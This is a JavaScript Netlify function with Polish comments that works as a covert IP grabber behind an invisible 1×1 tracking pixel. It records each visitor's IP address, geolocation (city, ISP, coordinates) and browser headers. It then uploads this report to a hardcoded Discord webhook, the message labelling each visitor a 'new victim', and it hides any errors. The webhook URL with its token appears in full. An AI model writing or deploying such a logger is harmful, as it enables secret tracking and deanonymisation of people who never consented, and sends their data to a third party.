// netlify/functions/advanced-ip-log.js

export default async (request) => {
  // ----------------------------------------------------
  // 1. Zbieranie IP (najlepsze metody na Netlify/Cloudflare)
  // ----------------------------------------------------
  const ipSources = [
    request.headers.get("x-forwarded-for")?.split(",")[0]?.trim(),
    request.headers.get("cf-connecting-ip"),
    request.headers.get("x-real-ip"),
    request.headers.get("true-client-ip"),
    request.socket?.remoteAddress,
  ].filter(Boolean);

  const ip = ipSources[0] || "unknown";

  // ----------------------------------------------------
  // 2. Podstawowe dane żądania
  // ----------------------------------------------------
  const now = new Date().toISOString();
  const ua = request.headers.get("user-agent") || "brak";
  const referer = request.headers.get("referer") || "bezpośrednie";
  const acceptLang = request.headers.get("accept-language") || "nieznane";
  const method = request.method;
  const url = request.url;

  // ----------------------------------------------------
  // 3. Geolokalizacja (kilka źródeł na wypadek limitów)
  // ----------------------------------------------------
  let geo = {
    country: "??",
    countryCode: "??",
    region: "??",
    city: "??",
    isp: "??",
    org: "??",
    timezone: "??",
    lat: "?",
    lon: "?",
  };

  try {
    // Najpierw ipapi.co (najczęściej najdokładniejszy darmowy)
    let res = await fetch(`https://ipapi.co/${ip}/json/`);
    if (res.ok) {
      const data = await res.json();
      if (!data.error) {
        geo = {
          country: data.country_name || "??",
          countryCode: data.country_code || "??",
          region: data.region || "??",
          city: data.city || "??",
          isp: data.org || data.asn || "??",
          org: data.org || "??",
          timezone: data.timezone || "??",
          lat: data.latitude?.toFixed(4) || "?",
          lon: data.longitude?.toFixed(4) || "?",
        };
      }
    }

    // Zapasowe źródło jeśli ipapi zawiedzie
    if (geo.country === "??") {
      res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,isp,org,timezone,lat,lon`);
      if (res.ok) {
        const data = await res.json();
        if (data.status === "success") {
          geo = {
            country: data.country || "??",
            countryCode: data.countryCode || "??",
            region: data.regionName || "??",
            city: data.city || "??",
            isp: data.isp || "??",
            org: data.org || "??",
            timezone: data.timezone || "??",
            lat: data.lat?.toFixed(4) || "?",
            lon: data.lon?.toFixed(4) || "?",
          };
        }
      }
    }
  } catch (e) {
    // cicho – nie zdradzamy błędu
  }

  // ----------------------------------------------------
  // 4. Dodatkowe ciekawe informacje
  // ----------------------------------------------------
  const extra = {
    accept: request.headers.get("accept") || "-",
    connection: request.headers.get("connection") || "-",
    dnt: request.headers.get("dnt") || "-",               // Do Not Track
    upgrade_insecure: request.headers.get("upgrade-insecure-requests") || "-",
    sec_ch_ua: request.headers.get("sec-ch-ua") || "-",
    sec_ch_platform: request.headers.get("sec-ch-ua-platform") || "-",
    sec_fetch_dest: request.headers.get("sec-fetch-dest") || "-",
    sec_fetch_mode: request.headers.get("sec-fetch-mode") || "-",
    sec_fetch_site: request.headers.get("sec-fetch-site") || "-",
  };

  // ----------------------------------------------------
  // 5. Tworzenie ładnego pliku tekstowego
  // ----------------------------------------------------
  const content = [
    `ADVANCED IP TELEMETRY LOG`,
    `══════════════════════════════════════════════`,
    `Czas:              ${now}`,
    `IP:                ${ip}`,
    ``,
    `KRAJ:              ${geo.country}  (${geo.countryCode})`,
    `Region:            ${geo.region}`,
    `Miasto:            ${geo.city}`,
    `ISP / Organizacja: ${geo.isp}  (${geo.org})`,
    `Strefa czasowa:    ${geo.timezone}`,
    `Współrzędne:       ${geo.lat} × ${geo.lon}`,
    ``,
    `User-Agent:        ${ua}`,
    `Referer:           ${referer}`,
    `Język przeglądarki:${acceptLang}`,
    `Metoda HTTP:       ${method}`,
    `Pełny URL:         ${url}`,
    ``,
    `Dodatkowe nagłówki:`,
    `  Accept:           ${extra.accept.slice(0, 80)}`,
    `  Connection:       ${extra.connection}`,
    `  DNT:              ${extra.dnt}`,
    `  Upgrade-Insecure: ${extra.upgrade_insecure}`,
    `  sec-ch-ua:        ${extra.sec_ch_ua.slice(0, 60)}`,
    `  sec-ch-platform:  ${extra.sec_ch_platform}`,
    `  sec-fetch-dest:   ${extra.sec_fetch_dest}`,
    `  sec-fetch-mode:   ${extra.sec_fetch_mode}`,
    `  sec-fetch-site:   ${extra.sec_fetch_site}`,
    `══════════════════════════════════════════════`,
    ``,
  ].join("\n");

  // ----------------------------------------------------
  // 6. Wysyłka do Discorda jako plik .txt
  // ----------------------------------------------------
  const webhook = "https://discord.com/api/webhooks/1460323910787530907/J0NXhcXMEpvHMYpKVwmH3ebjYXSitXJ-GX5N8ugXYq56hOTZre5unG6Uqqv329UhOHHp";

  const form = new FormData();
  form.append(
    "file",
    new Blob([content], { type: "text/plain;charset=utf-8" }),
    `telemetry_${ip.replace(/\./g, "-")}_${Date.now()}.txt`
  );
  form.append("content", `Nowa ofiara • ${geo.country} • ${geo.city} • ${ip}`);

  fetch(webhook, { method: "POST", body: form }).catch(() => {});

  // ----------------------------------------------------
  // 7. Odpowiedź – niewidoczny 1×1 piksel
  // ----------------------------------------------------
  const gif = Buffer.from(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
    "base64"
  );

  return new Response(gif, {
    status: 200,
    headers: {
      "Content-Type": "image/gif",
      "Cache-Control": "no-store, no-cache, must-revalidate",
    },
  });
};
